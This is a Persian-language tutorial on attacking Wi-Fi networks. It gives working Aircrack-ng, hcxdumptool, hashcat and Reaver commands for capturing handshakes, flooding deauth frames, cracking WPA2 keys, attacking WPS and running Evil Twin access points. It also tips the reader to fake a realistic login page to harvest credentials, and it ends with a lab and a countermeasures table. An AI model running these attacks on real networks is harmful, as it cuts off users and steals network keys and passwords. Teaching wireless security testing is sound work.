# هک شبکه بی‌سیم (Wireless)

**مدت یادگیری**: ۴ ساعت
**سطح سختی**: پیشرفته
**پیش‌نیاز**: فایل ۱۰ (شنود) و ۰۲ (شبکه)

---

## فهرست محتوا

- [فصل ۱: مقدمه و استانداردها](#فصل-۱-مقدمه-و-استانداردها)
- [فصل ۲: پروتکل‌های امنیتی](#فصل-۲-پروتکلهای-امنیتی)
- [فصل ۳: ابزارها](#فصل-۳-ابزارها)
- [فصل ۴: حملات بی‌سیم](#فصل-۴-حملات-بیسیم)
- [فصل ۵: آزمایشگاه و اقدامات متقابل](#فصل-۵-آزمایشگاه-و-اقدامات-متقابل)

---

## فصل ۱: مقدمه و استانداردها

### مقدمه

شبکه‌های بی‌سیم به‌دلیل انتشار امواج در فضا، **در معرض خطر** بیشتری هستند. هر کسی در محدوده می‌تواند ترافیک را ببیند.

> **تشبیه:** شبکه سیمی مثل پست خصوصی است؛ شبکه بی‌سیم مثل بلندگو در میدان عمومی.

### مفاهیم اساسی

**استانداردهای 802.11:**

| استاندارد | باند | حداکثر سرعت |
|-----------|------|-------------|
| 802.11a | 5 GHz | 54 Mbps |
| 802.11b | 2.4 GHz | 11 Mbps |
| 802.11g | 2.4 GHz | 54 Mbps |
| 802.11n | 2.4/5 GHz | 600 Mbps |
| 802.11ac | 5 GHz | چند Gbps |
| 802.11ax (Wi-Fi 6) | 2.4/5/6 GHz | چند Gbps |

**مفاهیم کلیدی:** SSID (نام شبکه)، BSSID (MAC اکسس‌پوینت)، Channel، Band، Beacon Frame.

**حالت‌های کارت بی‌سیم:**
- **Managed:** حالت عادی (اتصال).
- **Monitor:** شنود همه ترافیک.
- **Master:** اکسس‌پوینت.
- **Ad-hoc:** اتصال مستقیم.

### نکات مهم (Tips & Tricks)

- برای شنود به کارت با **Monitor Mode** و **Packet Injection** نیاز دارید.
- کارت‌های پیشنهادی: Alfa AWUS036ACH، TP-Link TL-WN722N (v1).
- باند ۲.۴ گیگابایت شلوغ‌تر اما برد بیشتر دارد.

### خلاصه فصل

- بی‌سیم در معرض خطر بیشتری است.
- استانداردها: 802.11a/b/g/n/ac/ax.
- Monitor Mode پیش‌نیاز شنود است.

---

## فصل ۲: پروتکل‌های امنیتی

### مقدمه

تکامل امنیت بی‌سیم از WEP ناامن تا WPA3 امن است.

### مفاهیم اساسی

| پروتکل | امنیت | وضعیت |
|--------|-------|-------|
| **WEP** | خیلی ضعیف | شکسته (چند دقیقه) |
| **WPA** | ضعیف | آسیب‌پذیر (TKIP) |
| **WPA2-Personal** | خوب | قابل حمله با Dictionary |
| **WPA2-Enterprise** | خوب | نیاز به RADIUS |
| **WPA3** | عالی | مقاوم به Dictionary |

**مفاهیم رمزنگاری:**
- **WEP:** RC4 با IV کوتاه (ضعیف).
- **WPA/WPA2:** TKIP/CCMP، 4-Way Handshake.
- **WPA3:** SAE (Dragonfly)، مقاوم به Offline Dictionary.

**نقطه ضعف اصلی WPA2:** **4-Way Handshake** قابل رهگیری است و سپس آفلاین کرک می‌شود.

### مثال عملی

```text
# چرا WEP شکسته می‌شود؟
# IV (Initialization Vector) فقط 24 بیت است → تکرار سریع
# با جمع‌آوری کافی IV (حدود 50,000)، کلید بازیابی می‌شود

# چرا WPA2 آسیب‌پذیر است؟
# Handshake شامل یک "MIC" قابل حمله با Dictionary است
# اگر رمز ضعیف باشد، کرک آفلاین موفق می‌شود
```

### اشکال شایع

- **مشکل:** WPA3 را نمی‌توان کرک کرد → درست است؛ SAE مقاوم است.
- **مشکل:** رمز WPA2 قوی است → Dictionary بی‌فایده؛ به مهندسی اجتماعی نیاز است.

### نکات مهم (Tips & Tricks)

- **WEP را همیشه به‌عنوان آسیب‌پذیر فرض کنید.**
- WPA2 با رمز قوی = عملاً امن در برابر کرک آفلاین.
- **PMKID Attack** نیازی به انتظار برای Handshake ندارد.
- **WPS** (پین ۸ رقمی) نقطه ضعف بزرگی است (Pixie Dust).

### خلاصه فصل

- WEP شکسته، WPA ضعیف، WPA2 خوب، WPA3 عالی.
- 4-Way Handshake نقطه ضعف WPA2 است.
- WPS آسیب‌پذیر است.

---

## فصل ۳: ابزارها

### مقدمه

مجموعه **Aircrack-ng** ابزار اصلی تست بی‌سیم است.

### مفاهیم اساسی

| ابزار | کاربرد |
|-------|--------|
| **airmon-ng** | فعال‌سازی Monitor Mode |
| **airodump-ng** | رهگیری شبکه‌ها و Handshake |
| **aireplay-ng** | تزریق بسته (Deauth) |
| **aircrack-ng** | کرک کلید |
| **Wifite** | خودکارسازی کامل |
| **Kismet** | رهگیری و شناسایی |
| **Reaver / Bully** | حمله WPS |
| **hashcat** | کرک Handshake با GPU |

### مثال عملی

```bash
# === ۱. فعال‌سازی Monitor Mode ===
sudo airmon-ng start wlan0
# → رابط wlan0mon ساخته می‌شود

# === ۲. رهگیری شبکه‌ها ===
sudo airodump-ng wlan0mon
# SSID، BSSID، Channel و کلاینت‌ها را ببینید

# === ۳. رهگیری یک شبکه خاص ===
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# === ۴. ارسال Deauth برای گرفتن Handshake ===
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# === ۵. کرک Handshake ===
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# === ۶. تبدیل برای Hashcat ===
hcxpcapngtool -o hash.hc22000 capture-01.cap
hashcat -m 22000 hash.hc22000 rockyou.txt

# === ۷. Wifite (خودکار) ===
sudo wifite

# === ۸. حمله WPS ===
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv
```

### اشکال شایع

- **مشکل:** Monitor Mode فعال نمی‌شود → درایور مناسب نصب کنید یا کارت دیگر.
- **مشکل:** Handshake گرفته نمی‌شود → کلاینت متصل لازم است؛ Deauth بفرستید.
- **مشکل:** `airmon-ng` با NetworkManager تداخل دارد → `sudo airmon-ng check kill`.

### نکات مهم (Tips & Tricks)

- **`airmon-ng check kill`** قبل از شروع، سرویس‌های مزاحم را می‌بندد.
- **PMKID** با `hcxdumptool` بدون نیاز به کلاینت گرفته می‌شود.
- **Hashcat با GPU** بسیار سریع‌تر از aircrack است.
- **Wifite** همه مراحل را خودکار می‌کند.

### خلاصه فصل

- Aircrack-ng مجموعه اصلی ابزارهاست.
- airmon-ng → airodump-ng → aireplay-ng → aircrack-ng.
- Wifite خودکارسازی می‌کند.

---

## فصل ۴: حملات بی‌سیم

### مقدمه

حملات بی‌سیم از کرک رمز تا فریب کلاینت‌ها متنوع است.

### مفاهیم اساسی

| حمله | توضیح |
|------|-------|
| **Deauthentication** | قطع اتصال کلاینت |
| **Evil Twin** | اکسس‌پوینت جعلی با SSID مشابه |
| **Rogue AP** | اکسس‌پوینت غیرمجاز |
| **PMKID** | گرفتن Hash بدون کلاینت |
| **WPS Pixie Dust** | استخراج پین WPS |
| **KRACK** | حمله به WPA2 Handshake |
| **Karma Attack** | پاسخ به Probe Requestها |
| **Wi-Fi Pineapple** | جعبه ابزار MITM بی‌سیم |

### مثال عملی

```bash
# === Evil Twin (با airbase-ng) ===
sudo airbase-ng -e "FreeWiFi" -c 6 wlan0mon

# === Evil Twin با hostapd-wpe ===
# ساخت AP جعلی برای شکار Credential

# === Deauth Flood ===
sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan0mon
# --deauth 0 = بی‌نهایت (قطع کامل)

# === PMKID Attack ===
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1
hcxpcapngtool -o pmkid.hc22000 pmkid.pcapng
hashcat -m 22000 pmkid.hc22000 rockyou.txt

# === Karma Attack ===
# با hostapd-mana یا ابزار مشابه
# AP به همه Probe Requestها پاسخ می‌دهد
```

### اشکال شایع

- **مشکل:** Evil Twin گواهی/رمز نمی‌گیرد → صفحه ورود شبیه واقعی بسازید.
- **مشکل:** Deauth بی‌اثر است → WPA3 و PMF مقاوم هستند.
- **مشکل:** PMKID نمی‌گیرد → همه APها از آن پشتیبانی نمی‌کنند.

### نکات مهم (Tips & Tricks)

- **Evil Twin + Captive Portal** = شکار مؤثر رمز.
- **PMF (Protected Management Frames)** جلوی Deauth را می‌گیرد.
- **Wi-Fi Pineapple** ابزار تجاری محبوب برای این حملات است.
- همیشه در محیط آزمایشگاهی و با مجوز.

### خلاصه فصل

- Deauth، Evil Twin، PMKID، WPS، Karma.
- Evil Twin مؤثرترین حمله شکار Credential است.
- PMF و WPA3 دفاع‌های جدیدند.

---

## فصل ۵: آزمایشگاه و اقدامات متقابل

### مقدمه

یک آزمایشگاه کامل کرک WPA2 بسازیم (با AP و کلاینت خودتان).

### مثال عملی — آزمایشگاه

```bash
# === آماده‌سازی ===
# یک AP آزمایشی با رمز ضعیف (مثل "password123") بسازید
# یک گوشی/لپ‌تاپ به آن وصل کنید

# === ۱. Monitor Mode ===
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# === ۲. کشف شبکه هدف ===
sudo airodump-ng wlan0mon

# === ۳. رهگیری شبکه و کلاینت ===
sudo airodump-ng -c <CHANNEL> --bssid <BSSID> -w capture wlan0mon

# === ۴. Deauth برای گرفتن Handshake ===
sudo aireplay-ng --deauth 5 -a <BSSID> -c <CLIENT_MAC> wlan0mon
# → "WPA handshake" در airodump ظاهر می‌شود

# === ۵. کرک ===
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# === ۶. (جایگزین) PMKID ===
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng
hcxpcapngtool -o pmkid.hc22000 pmkid.pcapng
hashcat -m 22000 pmkid.hc22000 rockyou.txt
```

### اشکال شایع

- **مشکل:** Handshake نمی‌گیرم → مطمئن شوید کلاینتی متصل است.
- **مشکل:** کرک طول می‌کشد → wordlist بهتر یا Hashcat با GPU.

### نکات مهم (Tips & Tricks)

- **فقط روی شبکه خودتان** تمرین کنید.
- رمز قوی (بالای ۱۲ کاراکتر، تصادفی) کرک را عملاً غیرممکن می‌کند.
- بعد از تست، Monitor Mode را خاموش کنید: `airmon-ng stop wlan0mon`.

### اقدامات متقابل (Countermeasures)

| حمله | راهکار دفاعی |
|------|--------------|
| WEP Crack | ارتقا به WPA2/WPA3 |
| Handshake Capture | رمز قوی، WPA3 |
| Deauth | PMF (802.11w) |
| Evil Twin | بررسی BSSID، آموزش کاربران |
| WPS | غیرفعال‌سازی WPS |
| Rogue AP | WIPS، مانیتورینگ |
| Karma | به‌روزرسانی کلاینت‌ها |

### خلاصه فصل

- آزمایشگاه: Monitor → Capture → Deauth → Crack.
- رمز قوی + WPA3 + PMF بهترین دفاع.
- WPS را غیرفعال کنید.

---

## منابع و مراجع

- **Aircrack-ng:** https://www.aircrack-ng.org/
- **Wifite:** https://github.com/derv82/wifite2
- **Kismet:** https://www.kismetwireless.net/
- **hcxdumptool:** https://github.com/ZerBea/hcxdumptool
- **Hashcat:** https://hashcat.net/hashcat/
- **Wi-Fi Pineapple:** https://hak5.org/
- **WPA3 (SAE):** https://www.wi-fi.org/discover-wi-fi/security
